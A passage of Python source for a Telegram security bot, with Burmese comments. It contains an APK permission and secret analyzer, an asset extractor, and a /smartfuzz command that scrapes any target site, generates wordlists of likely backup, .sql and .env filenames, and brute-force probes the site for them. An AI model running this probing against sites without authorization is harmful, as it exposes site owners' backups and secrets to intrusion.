            "android.permission.DELETE_PACKAGES",
            "android.permission.WRITE_SYSTEM_PARTITIONS",
        ],
        "HIGH": [
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_SMS",
            "android.permission.SEND_SMS",
            "android.permission.RECORD_AUDIO",
            "android.permission.CAMERA",
            "android.permission.GET_ACCOUNTS",
            "android.permission.READ_CONTACTS",
            "android.permission.WRITE_CONTACTS",
        ],
        "MEDIUM": [
            "android.permission.INTERNET",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
        ]
    }
    
    SUSPICIOUS_COMBINATIONS = [
        {
            "permissions": ["android.permission.ACCESS_FINE_LOCATION", "android.permission.INTERNET"],
            "risk": "📍 Location tracking + network",
            "severity": "🔴 HIGH"
        },
        {
            "permissions": ["android.permission.RECORD_AUDIO", "android.permission.INTERNET"],
            "risk": "🎙️ Audio recording + network",
            "severity": "🔴 HIGH"
        },
        {
            "permissions": ["android.permission.CAMERA", "android.permission.INTERNET"],
            "risk": "📷 Camera + network",
            "severity": "🔴 HIGH"
        },
        {
            "permissions": ["android.permission.READ_CONTACTS", "android.permission.INTERNET"],
            "risk": "👥 Contact reading + network",
            "severity": "🟠 MEDIUM"
        },
        {
            "permissions": ["android.permission.READ_SMS", "android.permission.INTERNET"],
            "risk": "💬 SMS reading + network",
            "severity": "🔴 HIGH"
        },
    ]
    
    @staticmethod
    def analyze(permissions: List[str]) -> Dict:
        """ခွင့်ခြင်း အန္တရာယ် ခွဲခြည်း"""
        
        result = {
            "by_level": {},
            "risk_score": 0,
            "suspicious_combinations": [],
            "recommendations": [],
        }
        
        perm_set = set(permissions)
        
        for level, perms in PermissionRiskAnalyzer.RISK_LEVELS.items():
            matched = [p for p in perms if p in perm_set]
            if matched:
                result["by_level"][level] = matched
                if level == "CRITICAL":
                    result["risk_score"] += len(matched) * 25
                elif level == "HIGH":
                    result["risk_score"] += len(matched) * 15
                else:
                    result["risk_score"] += len(matched) * 5
        
        for combo in PermissionRiskAnalyzer.SUSPICIOUS_COMBINATIONS:
            if all(p in perm_set for p in combo["permissions"]):
                result["suspicious_combinations"].append({
                    "permissions": combo["permissions"],
                    "risk": combo["risk"],
                    "severity": combo["severity"]
                })
        
        result["risk_score"] = min(100, result["risk_score"])
        
        if result["risk_score"] >= 80:
            result["recommendations"].append("🔴 အလွန်အန္တရာယ်")
        elif result["risk_score"] >= 50:
            result["recommendations"].append("🟠 အန္တရာယ်ရှိသည်")
        else:
            result["recommendations"].append("🟢 အရေးမကြီး")
        
        return result


# ══════════════════════════════════════════════════════════════════════════
# 4️⃣  FILE STRUCTURE ANALYSIS
# ══════════════════════════════════════════════════════════════════════════

class APKFileAnalyzer:
    """APK ထဲက ဖိုင်အမျိုးအစားများ ခွဲခွာခြည်း"""
    
    @staticmethod
    def analyze_structure(apk_path: str, progress_callback: Callable = None) -> Dict:
        """APK ဖိုင်သဲတည်ဆောင်ပုံ ခွဲခွာခြည်း"""
        
        result = {
            "native_libraries": [],
            "dex_files": [],
            "web_content": {
                "html": [],
                "js": [],
                "css": [],
                "suspect_js": [],
            },
            "config_files": [],
            "databases": [],
            "archives": [],
            "total_files": 0,
            "file_distribution": defaultdict(int),
            "largest_files": [],
        }
        
        try:
            with zipfile.ZipFile(apk_path, 'r') as zf:
                files = zf.namelist()
                result["total_files"] = len(files)
                
                if progress_callback:
                    progress_callback(f"📦 Total files: `{len(files)}`")
                
                largest = []
                
                for filename in files:
                    if filename.endswith('.so'):
                        arch = filename.split('/')[-2] if '/' in filename else "unknown"
                        result["native_libraries"].append({
                            "file": filename,
                            "arch": arch,
                        })
                    
                    elif filename.endswith('.dex'):
                        result["dex_files"].append(filename)
                    
                    elif filename.endswith(('.html', '.htm')):
                        result["web_content"]["html"].append(filename)
                    
                    elif filename.endswith('.js'):
                        result["web_content"]["js"].append(filename)
                        try:
                            content = zf.read(filename).decode('utf-8', errors='ignore')
                            if re.search(r'(eval|Function\(|exec)\s*\(', content):
                                result["web_content"]["suspect_js"].append(filename)
                        except Exception:
                            pass
                    
                    elif filename.endswith('.css'):
                        result["web_content"]["css"].append(filename)
                    
                    elif filename.endswith(('.json', '.xml', '.properties', '.yaml', '.yml')):
                        result["config_files"].append(filename)
                    
                    elif filename.endswith(('.db', '.sqlite', '.sqlite3')):
                        result["databases"].append(filename)
                    
                    elif filename.endswith(('.zip', '.tar', '.gz', '.rar')):
                        result["archives"].append(filename)
                    
                    ext = os.path.splitext(filename)[1].lower() or "no_ext"
                    result["file_distribution"][ext] += 1
                    
                    file_size = zf.getinfo(filename).file_size
                    if len(largest) < 10:
                        largest.append((filename, file_size))
                    else:
                        largest.sort(key=lambda x: -x[1])
                        if file_size > largest[-1][1]:
                            largest[-1] = (filename, file_size)
                
                result["largest_files"] = [
                    {"file": f[0], "size_kb": f[1]/1024}
                    for f in sorted(largest, key=lambda x: -x[1])[:5]
                ]
        
        except Exception as e:
            if progress_callback:
                progress_callback(f"⚠️ Error: `{e}`")
        
        return result


# ══════════════════════════════════════════════════════════════════════════
# 5️⃣  MAIN ANALYSIS ENGINE
# ══════════════════════════════════════════════════════════════════════════

def analyze_apk_enhanced(apk_path: str, progress_callback: Callable = None) -> Dict:
    """အသုံးဝင်သောအချက်အလက် များများ APK analysis"""
    
    if progress_callback:
        progress_callback("🔍 Phase 1: Metadata ကောက်ယူခြင်း...")
    
    extractor = APKMetadataExtractor(apk_path)
    metadata = extractor.parse_manifest()
    
    if progress_callback:
        progress_callback("🔍 Phase 2: Binary strings ကောက်ယူခြင်း...")
    
    binary_data = BinaryStringExtractor.extract_from_dex(apk_path, progress_callback)
    
    if progress_callback:
        progress_callback("🔍 Phase 3: ခွင့်ခြင်း အန္တရာယ် ခွဲခွာခြည်း...")
    
    permissions = metadata.get("permissions", [])
    permission_risk = PermissionRiskAnalyzer.analyze(permissions)
    
    if progress_callback:
        progress_callback("🔍 Phase 4: ဖိုင်သဲ ခွဲခွာခြည်း...")
    
    file_analysis = APKFileAnalyzer.analyze_structure(apk_path, progress_callback)
    
    # Combine results
    final_result = {
        "timestamp": datetime.now().isoformat(),
        "file_path": apk_path,
        "file_name": os.path.basename(apk_path),
        "file_type": "APK",
        "file_size_mb": os.path.getsize(apk_path) / 1024 / 1024,
        
        "metadata": metadata,
        "binary_analysis": {
            "urls": list(binary_data.get("urls", [])),
            "api_endpoints": list(binary_data.get("api_endpoints", [])),
            "domains": list(binary_data.get("domains", [])),
            "secrets": dict(binary_data.get("secrets", {})),
            "suspicious_strings": binary_data.get("suspicious_strings", []),
            "hardcoded_ips": list(binary_data.get("hardcoded_ips", [])),
            "websocket_urls": list(binary_data.get("websocket_urls", [])),
        },
        "permission_analysis": permission_risk,
        "file_analysis": file_analysis,
        
        "summary": {
            "total_files": file_analysis["total_files"],
            "unique_urls": len(binary_data["urls"]),
            "unique_domains": len(binary_data["domains"]),
            "api_endpoints": len(binary_data["api_endpoints"]),
            "secrets_detected": len(binary_data["secrets"]),
            "risk_score": permission_risk["risk_score"],
            "is_debuggable": metadata.get("debuggable", False),
            "native_libraries": len(file_analysis["native_libraries"]),
            "dex_files": len(file_analysis["dex_files"]),
            "web_content_detected": bool(file_analysis["web_content"]["html"] or 
                                         file_analysis["web_content"]["js"]),
        }
    }
    
    return final_result


# ══════════════════════════════════════════════════════════════════════════
# 📱 INTEGRATION GUIDE — Bot ထဲတွင် အဖွဲ့ခွဲခြင်း
# ══════════════════════════════════════════════════════════════════════════

"""
STEP 1: Bot ဖိုင်သို့ Import ထည့်သွင်းခြင်း
═════════════════════════════════════════════

Add this to your bot file (line 26-30 အနီးတွင်):

    from enhanced_apk_analyzer import analyze_apk_enhanced

STEP 2: analyze_app_file() Function အစားထိုးခြင်း
═════════════════════════════════════════════

Replace existing analyze_app_file() function with:

    def analyze_app_file(filepath: str, progress_cb=None) -> dict:
        '''APK analysis — enhanced version'''
        try:
            result = analyze_apk_enhanced(filepath, progress_cb)
            
            # Compatibility layer for existing code
            result["urls"] = result["binary_analysis"].get("urls", [])
            result["api_paths"] = result["binary_analysis"].get("api_endpoints", [])
            result["ws_urls"] = result["binary_analysis"].get("websocket_urls", [])
            result["secrets"] = result["binary_analysis"].get("secrets", {})
            result["source_files"] = result["file_analysis"].get("config_files", [])[:10]
            result["app_info"] = result.get("metadata", {})
            result["stats"] = {
                "total_files": result["file_analysis"]["total_files"],
                "text_files_scanned": len(result["binary_analysis"]["domains"]),
                "unique_urls": len(result["binary_analysis"]["urls"]),
                "api_paths": len(result["binary_analysis"]["api_endpoints"]),
                "ws_urls": len(result["binary_analysis"]["websocket_urls"]),
                "secret_types": len(result["binary_analysis"]["secrets"]),
            }
            result["errors"] = []
            
            if progress_cb:
                progress_cb("✅ Analysis complete!")
            
            return result
        except Exception as e:
            return {
                "file_type": "APK",
                "file_size_mb": os.path.getsize(filepath) / 1024 / 1024,
                "urls": [],
                "api_paths": [],
                "ws_urls": [],
                "secrets": {},
                "source_files": [],
                "app_info": {},
                "stats": {},
                "errors": [str(e)],
            }

STEP 3: Message Formatting အဆင့်မြှင့်တင်ခြင်း
═════════════════════════════════════════════

In handle_app_upload() function (line ~5419), replace message building with:

    # Extract data
    summary = result.get("summary", {})
    perm_risk = result.get("permission_analysis", {})
    binary = result.get("binary_analysis", {})
    file_analysis = result.get("file_analysis", {})
    risk_score = perm_risk.get("risk_score", 0)
    
    # Risk color
    if risk_score >= 80:
        risk_icon = "🔴"
    elif risk_score >= 50:
        risk_icon = "🟠"
    else:
        risk_icon = "🟢"
    
    lines = [
        f"🔍 *APK Deep Analysis*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"📦 {result.get('file_type')} | 💾 {result.get('file_size_mb', 0):.2f}MB",
        f"{risk_icon} *Risk: {risk_score}/100*",
        "",
        f"📱 *App Info:*",
        f"  • Package: `{result.get('app_info', {}).get('package', 'N/A')}`",
        f"  • Version: `{result.get('app_info', {}).get('version_name', '?')}`",
        f"  • Target SDK: `{result.get('app_info', {}).get('target_sdk', '?')}`",
        f"  • Debuggable: `{result.get('app_info', {}).get('debuggable', False)}`",
        "",
    ]
    
    # Permissions
    crit_perms = perm_risk.get("by_level", {}).get("CRITICAL", [])
    if crit_perms:
        lines.append(f"🔑 *Critical Permissions ({len(crit_perms)}):*")
        for p in crit_perms[:5]:
            lines.append(f"  🔴 `{p.split('.')[-1]}`")
        lines.append("")
    
    # Suspicious combinations
    suspicious = perm_risk.get("suspicious_combinations", [])
    if suspicious:
        lines.append(f"⚠️ *Suspicious Patterns:*")
        for combo in suspicious[:3]:
            lines.append(f"  • {combo.get('risk')}")
        lines.append("")
    
    # Secrets
    secrets = binary.get("secrets", {})
    if secrets:
        lines.append(f"🔑 *Secrets Found:*")
        for secret_type, items in list(secrets.items())[:8]:
            icon = "🔴" if "Key" in secret_type else "🟡"
            lines.append(f"  {icon} `{secret_type}`: `{len(set(items))}`")
        lines.append("")
    
    # Domains
    domains = binary.get("domains", [])
    if domains:
        lines.append(f"🌐 *Hosts ({len(domains)}):*")
        for domain in sorted(list(domains))[:10]:
            lines.append(f"  🔵 `{domain}`")
        if len(domains) > 10:
            lines.append(f"  _...and {len(domains)-10} more_")
    
    tg_text = "\\n".join(lines)
    await msg.edit_text(tg_text[:4000], parse_mode='Markdown')
    
    # Send detailed JSON
    import io as _io
    report = json.dumps(result, indent=2, default=str)
    buf = _io.BytesIO(report.encode())
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=buf,
        filename=f"apk_analysis_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
        caption="📄 Full Analysis Report"
    )

STEP 4: အုံးဆည်းခြင်း ပြီးခွင့်များ
═════════════════════════════════════════════

- Imports ထည့်သွင်းခြင်း
- analyze_app_file() အစားထိုးခြင်း
- Message formatting အစားထိုးခြင်း
- Bot စမ်းသပ်ခြင်း (APK upload)
- Log မှတ်တမ်းတင်ခြင်း အုံးဆည်းခြင်း

"""


# ══════════════════════════════════════════════════════════════════════════
# 🧪 TESTING & CLI USAGE
# ══════════════════════════════════════════════════════════════════════════


# ──────────────────────────────────────────────────
# Compatibility wrapper for existing code
# ──────────────────────────────────────────────────

def analyze_app_file(filepath: str, progress_cb=None) -> dict:
    """APK analysis — enhanced version with full compatibility"""
    try:
        result = analyze_apk_enhanced(filepath, progress_cb)
        
        # Compatibility layer for existing code
        result["urls"] = result["binary_analysis"].get("urls", [])
        result["api_paths"] = result["binary_analysis"].get("api_endpoints", [])
        result["ws_urls"] = result["binary_analysis"].get("websocket_urls", [])
        result["secrets"] = result["binary_analysis"].get("secrets", {})
        result["source_files"] = result["file_analysis"].get("config_files", [])[:10]
        result["app_info"] = result.get("metadata", {})
        result["stats"] = {
            "total_files": result["file_analysis"]["total_files"],
            "text_files_scanned": len(result["binary_analysis"]["domains"]),
            "unique_urls": len(result["binary_analysis"]["urls"]),
            "api_paths": len(result["binary_analysis"]["api_endpoints"]),
            "ws_urls": len(result["binary_analysis"]["websocket_urls"]),
            "secret_types": len(result["binary_analysis"]["secrets"]),
        }
        result["errors"] = []
        
        if progress_cb:
            progress_cb("✅ Analysis complete!")
        
        return result
    
    except Exception as e:
        logger.error(f"APK analysis failed: {e}")
        return {
            "file_type": "APK",
            "file_size_mb": os.path.getsize(filepath) / 1024 / 1024,
            "urls": [],
            "api_paths": [],
            "ws_urls": [],
            "secrets": {},
            "source_files": [],
            "app_info": {},
            "stats": {},
            "errors": [str(e)],
        }



async def cmd_appassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/appassets — Extract specific asset types from uploaded APK/IPA/ZIP"""
    uid = update.effective_user.id

    # Force join check
    if not await check_force_join(update, context):
        return

    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    # Check if user has a recently uploaded file
    async with db_lock:
        db = _load_db_sync()
    u = get_user(db, uid)
    last_app = u.get("last_uploaded_app")

    if not last_app or not os.path.exists(last_app):
        await update.effective_message.reply_text(
            "📦 *APK Asset Extractor*\n\n"
            "APK / IPA / ZIP / JAR ဖိုင်ကို ဦးစွာ Chat ထဲ Upload လုပ်ပါ\n"
            "Upload ပြီးရင် `/appassets` ကို ရိုက်ပြီး Category ရွေးပါ\n\n"
            "Extract လုပ်နိုင်သော Category များ:\n"
            "🖼 `images` — PNG, JPG, SVG, WebP\n"
            "🎵 `audio` — MP3, WAV, OGG, AAC\n"
            "🎬 `video` — MP4, WebM, MKV\n"
            "📐 `layouts` — XML Layout files\n"
            "⚙️ `dex` — classes.dex (bytecode)\n"
            "🔧 `so_libs` — .so Native libraries\n"
            "🔤 `fonts` — TTF, OTF, WOFF\n"
            "🔒 `certs` — PEM, CER, Keystores\n"
            "📋 `configs` — JSON, YAML, Properties\n"
            "📝 `scripts` — JS, Python, Shell\n"
            "📄 `docs` — PDF, TXT, HTML\n"
            "🗜 `archives` — ZIP, TAR, GZ",
            parse_mode='Markdown'
        )
        return

    # Parse category args
    valid_cats = set(_ASSET_CATEGORIES.keys())
    wanted_cats = set()
    if context.args:
        for a in context.args:
            a = a.lower().strip()
            if a == "all":
                wanted_cats = valid_cats.copy()
                break
            if a in valid_cats:
                wanted_cats.add(a)

    if not wanted_cats:
        # Build selection keyboard
        rows = []
        cats_list = list(valid_cats)
        for i in range(0, len(cats_list), 3):
            row = [InlineKeyboardButton(c, callback_data=f"apa_{c}") for c in cats_list[i:i+3]]
            rows.append(row)
        rows.append([InlineKeyboardButton("📦 ALL Categories", callback_data="apa_all")])
        await update.effective_message.reply_text(
            "📦 *Extract လုပ်မည့် Category ရွေးပါ:*\n\n"
            "_(သို့မဟုတ်)_ `/appassets images audio layouts` ဟု ရိုက်နိုင်သည်",
            reply_markup=InlineKeyboardMarkup(rows),
            parse_mode='Markdown'
        )
        return

    await _do_appassets_extract(update, context, last_app, wanted_cats)


async def _do_appassets_extract(update, context, filepath: str, wanted_cats: set):
    import io
    fname = os.path.basename(filepath)
    msg = await update.effective_message.reply_text(
        f"📦 *Asset Extractor — `{fname}`*\n\n"
        f"Categories: `{', '.join(sorted(wanted_cats))}`\n"
        "⏳ Extracting...",
        parse_mode='Markdown'
    )
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"📦 *Extracting `{fname}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(
            _extract_apk_assets_sync, filepath, wanted_cats,
            lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    if result.get("errors") and result.get("extracted", 0) == 0:
        await msg.edit_text(f"❌ `{'\\n'.join(result['errors'][:3])}`", parse_mode='Markdown')
        return

    stats = result["stats"]
    extracted = result.get("extracted", 0)
    zip_buf: io.BytesIO = result.get("zip_buffer")

    if extracted == 0:
        stat_lines = "\n".join(f"  {cat}: `0`" for cat in sorted(wanted_cats))
        await msg.edit_text(
            f"📭 *No files found*\n\nCategory တွေမှာ ဖိုင် မတွေ့ပါ:\n{stat_lines}",
            parse_mode='Markdown'
        )
        return

    stat_lines = "\n".join(
        f"  {cat}: `{stats.get(cat, 0)}`" for cat in sorted(wanted_cats)
    )
    zip_buf.seek(0)
    zip_size_mb = zip_buf.getbuffer().nbytes / 1024 / 1024

    await msg.edit_text(
        f"✅ *Extraction ပြီးပါပြီ*\n\n"
        f"📦 Extracted: `{extracted}` files\n"
        f"💾 Size: `{zip_size_mb:.2f}` MB\n\n"
        f"*Per Category:*\n{stat_lines}\n\n"
        "📤 ZIP upload နေပါသည်...",
        parse_mode='Markdown'
    )

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_fname = re.sub(r'[^\w\-]', '_', os.path.splitext(os.path.basename(filepath))[0])
    zip_name = f"assets_{safe_fname}_{ts}.zip"

    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=zip_buf,
            filename=zip_name,
            caption=(
                f"📦 *APK Assets — `{os.path.basename(filepath)}`*\n"
                f"📂 `{extracted}` files extracted\n"
                f"💾 `{zip_size_mb:.2f}` MB\n"
                f"Categories: `{', '.join(sorted(wanted_cats))}`"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.effective_message.reply_text(f"❌ Upload error: `{e}`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# ══════════════════════════════════════════════════

_SMARTFUZZ_STOP_WORDS = {
    'the','a','an','in','on','at','for','of','to','is','are','was','were',
    'and','or','but','if','with','this','that','from','by','not','it',
    'be','as','we','you','he','she','they','have','has','had','do','does',
    'did','will','would','could','should','may','might','can','our','your',
    'their','its','which','who','what','how','when','where','why',
}

def _build_context_wordlist(url: str, progress_cb=None) -> tuple:
    """
    CeWL-style: scrape target, extract unique words → generate permutations.
    Returns (wordlist: list, raw_words: list)
    """
    parsed = urlparse(url)
    root   = f"{parsed.scheme}://{parsed.netloc}"
    domain_parts = parsed.netloc.replace('www.', '').split('.')

    all_words = set()

    # ── Scrape homepage + up to 3 internal pages ──
    try:
        r = requests.get(url, headers=_get_headers(), timeout=12, verify=False)
        soup = BeautifulSoup(r.text, 'html.parser')
        if progress_cb:
            progress_cb("🌐 Homepage scraped")

        # Extract text words
        for tag in soup.find_all(['h1','h2','h3','h4','title','p','li','span','a','button','label']):
            text = tag.get_text(separator=' ')
            for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', text):
                all_words.add(w.lower())

        # Extract from meta tags
        for meta in soup.find_all('meta'):
            content = meta.get('content', '') + ' ' + meta.get('name', '')
            for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', content):
                all_words.add(w.lower())

        # Extract from JS variables / identifiers
        for script in soup.find_all('script'):
            src_text = script.string or ''
            for w in re.findall(r'(?:var|let|const|function)\s+([a-zA-Z_][a-zA-Z0-9_]{2,20})', src_text):
                all_words.add(w.lower())

        # Extract from class names and IDs
        for tag in soup.find_all(True):
            for attr in ('class', 'id', 'name'):
                vals = tag.get(attr, [])
                if isinstance(vals, str):
                    vals = [vals]
                for v in vals:
                    for w in re.split(r'[-_\s]', v):
                        if 3 <= len(w) <= 20:
                            all_words.add(w.lower())

        # Crawl 3 more internal pages
        links = list(get_internal_links(r.text, url))[:3]
        for link in links:
            try:
                r2 = requests.get(link, headers=_get_headers(), timeout=8, verify=False)
                soup2 = BeautifulSoup(r2.text, 'html.parser')
                for tag in soup2.find_all(['h1','h2','h3','title','p']):
                    for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', tag.get_text()):
                        all_words.add(w.lower())
            except Exception:
                pass

    except Exception as e:
        if progress_cb:
            progress_cb(f"⚠️ Scrape error: {e}")

    # Add domain parts
    for part in domain_parts:
        all_words.add(part.lower())

    # Filter stop words + numeric-only
    raw_words = sorted(
        w for w in all_words
        if w not in _SMARTFUZZ_STOP_WORDS and not w.isdigit() and len(w) >= 3
    )

    if progress_cb:
        progress_cb(f"📝 Raw words: `{len(raw_words)}`")

    # ── Generate permutations ──────────────────────
    current_year = datetime.now().year
    years        = [str(y) for y in range(current_year - 3, current_year + 2)]
    suffixes      = ['', '_backup', '_old', '_bak', '.bak', '_2025', '_2024',
                     '_dev', '_test', '_staging', '_prod', '_new', '_v2',
                     '.zip', '.sql', '.tar.gz', '.env', '.json']
    prefixes      = ['', 'backup_', 'old_', 'dev_', 'test_', 'admin_', 'api_',
                     '.', '_']

    wordlist = set()

    # Base words
    for w in raw_words[:80]:   # top 80 words
        wordlist.add(w)
        wordlist.add(w + '.php')
        wordlist.add(w + '.html')
        wordlist.add(w + '.txt')
        # Year combos
        for yr in years[:3]:
            wordlist.add(f"{w}_{yr}")
            wordlist.add(f"{w}_{yr}.zip")
            wordlist.add(f"{w}_{yr}.sql")
        # Suffix combos
        for suf in suffixes[:8]:
            wordlist.add(w + suf)
        # Prefix combos
        for pfx in prefixes[:5]:
            if pfx:
                wordlist.add(pfx + w)

    # Domain-specific combos
    for part in domain_parts[:3]:
        for yr in years:
            wordlist.add(f"{part}_{yr}")
            wordlist.add(f"{part}_{yr}.zip")
            wordlist.add(f"{part}_backup_{yr}")
            wordlist.add(f"backup_{part}")
            wordlist.add(f"{part}_db.sql")
            wordlist.add(f"{part}.sql")

    final_wordlist = sorted(wordlist)
    if progress_cb:
        progress_cb(f"🎯 Wordlist: `{len(final_wordlist)}` entries generated")

    return final_wordlist, raw_words


def _smartfuzz_probe_sync(base_url: str, wordlist: list, progress_cb=None) -> list:
    """Probe all wordlist entries against target."""
    found = []

    # Baseline fingerprint
    try:
        r404 = requests.get(
            base_url.rstrip('/') + '/xyznotfound_abc123_never_exists',
            timeout=6, verify=False, headers=_get_headers()
        )
        baseline_status = r404.status_code
        baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
        baseline_size   = len(r404.content)
    except Exception:
        baseline_status, baseline_hash, baseline_size = 404, '', 0

    def _probe(word):
        target = base_url.rstrip('/') + '/' + word.lstrip('/')
        try:
            r = requests.get(target, timeout=5, verify=False, headers=_get_headers(),
                             allow_redirects=True, stream=True)
            chunk = b''
            for part in r.iter_content(512):
                chunk += part
                if len(chunk) >= 512: break
            r.close()
            r_hash = hashlib.md5(chunk[:512]).hexdigest()
            r_size = len(chunk)
            # Filter baseline catch-all
            if r.status_code == baseline_status:
                if r_hash == baseline_hash: return None
                if baseline_size > 0 and abs(r_size - baseline_size) < 30: return None
            if r.status_code in (200, 201, 301, 302, 401, 403, 500):
                return {"url": target, "word": word, "status": r.status_code, "size": r_size}
        except Exception as _e:
            logging.debug("Scan error: %s", _e)
        return None

    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, w): w for w in wordlist}
        try:
            for fut in concurrent.futures.as_completed(fmap, timeout=120):
                done += 1
                if progress_cb and done % 30 == 0:
                    progress_cb(f"🧪 Fuzzing: `{done}/{len(wordlist)}` | Found: `{len(found)}`")
                try:
                    res = fut.result(timeout=6)
                    if res:
                        found.append(res)
                except Exception:
                    pass
        except concurrent.futures.TimeoutError:
            for f in fmap: f.cancel()
            if progress_cb:
                progress_cb(f"⚠️ Timeout — partial: `{done}/{len(wordlist)}`")

    found.sort(key=lambda x: (x['status'] != 200, x['status']))
    return found


async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/smartfuzz <url> — Context-aware wordlist builder + fuzzer"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/smartfuzz https://example.com`\n\n"
            "🗂️ *Smart Fuzzer — 3 Phases:*\n\n"
            "① *Context Harvesting* — Target ကို scrape ပြီး\n"
            "   Company name, product name, developer identifiers,\n"
            "   JS variables, class/ID names, meta keywords\n"
            "   တွေကို ဆုပ်ကိုင်ပါမည်\n\n"
            "② *Wordlist Generation* (CeWL-style)\n"
            "   ရလာတဲ့ words တွေကို backup/year/suffix combos\n"
            "   နဲ့ permutate လုပ်ပြီး custom dictionary ဆောက်ပါမည်\n"
            "   Example: `companyname_backup_2025.zip`\n\n"
            "③ *Smart Fuzzing*\n"
            "   Custom wordlist ဖြင့် target ကို probe လုပ်ပြီး\n"
            "   Baseline fingerprinting ဖြင့် false-positive စစ်ပါမည်\n\n"
            "📦 Wordlist + Results ကို export ပေးမည်\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).netloc
    base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    msg = await update.effective_message.reply_text(
        f"🗂️ *Smart Fuzzer — `{domain}`*\n\n"
        "① Harvesting words from target...\n"
        "② Building custom wordlist...\n"
        "③ Fuzzing...\n\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🗂️ *SmartFuzz — `{domain}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        wordlist, raw_words = await asyncio.to_thread(
            _build_context_wordlist, url, lambda t: progress_q.append(t)
        )
        if not wordlist:
            prog.cancel()
            await msg.edit_text("❌ Words ဆွဲထုတ်မရပါ — site ကို access လုပ်မရနိုင်ပါ", parse_mode='Markdown')
            return

        progress_q.append(f"✅ Wordlist: `{len(wordlist)}` words\n🧪 Fuzzing နေပါသည်...")
        found = await asyncio.to_thread(
            _smartfuzz_probe_sync, base_url, wordlist,
            lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    # ── Summary ───────────────────────────────────
    hits_200   = [f for f in found if f['status'] == 200]
    hits_auth  = [f for f in found if f['status'] in (401, 403)]
    hits_redir = [f for f in found if f['status'] in (301, 302)]
    hits_err   = [f for f in found if f['status'] == 500]

    lines = [
        f"🗂️ *SmartFuzz Results — `{domain}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"📝 Words scraped: `{len(raw_words)}`",
        f"🎯 Wordlist generated: `{len(wordlist)}`",
        f"🔍 Total probed: `{len(wordlist)}`",
        f"✅ Found: `{len(found)}` interesting",
        "",
    ]

    if hits_200:
        lines.append(f"*✅ HTTP 200 — Accessible ({len(hits_200)}):*")
        for h in hits_200[:15]:
            lines.append(f"  🟢 `/{h['word']}` → `{h['size']}B`")
        lines.append("")

    if hits_auth:
        lines.append(f"*🔒 Protected 401/403 ({len(hits_auth)}):*")
        for h in hits_auth[:10]:
            lines.append(f"  🔐 `/{h['word']}` [{h['status']}]")
        lines.append("")

    if hits_redir:
        lines.append(f"*↩️ Redirects ({len(hits_redir)}):*")
        for h in hits_redir[:5]:
            lines.append(f"  ↪ `/{h['word']}` [{h['status']}]")
        lines.append("")

    if hits_err:
        lines.append(f"*⚠️ Server Errors 500 ({len(hits_err)}):*")
        for h in hits_err[:5]:
            lines.append(f"  🔴 `/{h['word']}`")
        lines.append("")

    if not found:
        lines.append("📭 _Interesting paths မတွေ့ပါ_")

    lines.append("⚠️ _Authorized testing only_")

    report = "\n".join(lines)
    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')

    # ── Export wordlist + results as ZIP ─────────
    import io, zipfile as _zf
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    zip_buf = io.BytesIO()

    with _zf.ZipFile(zip_buf, 'w', _zf.ZIP_DEFLATED) as zf:
        zf.writestr("wordlist.txt", "\n".join(wordlist))
        zf.writestr("raw_words.txt", "\n".join(sorted(raw_words)))
        result_lines = [f"{f['status']}\t{f['url']}\t{f['size']}B" for f in found]
        zf.writestr("results.txt", "\n".join(result_lines) or "No results")
        zf.writestr("results.json", json.dumps({
